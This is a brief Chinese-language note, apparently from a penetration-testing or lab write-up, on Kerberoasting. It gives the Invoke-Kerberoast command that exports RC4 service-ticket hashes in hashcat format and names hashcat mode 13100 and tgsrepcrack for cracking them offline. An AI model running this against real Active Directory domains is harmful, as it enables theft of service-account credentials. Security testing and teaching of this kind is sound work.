




use Invoke-Kerberoast 成功导出 `$krb5tgs$23$` hash，说明这是 RC4 Kerberoasting，可使用 hashcat（-m 13100）或 tgsrepcrack 进行离线爆破。

```
Invoke-Kerberoast -OutputFormat hashcat | fl
```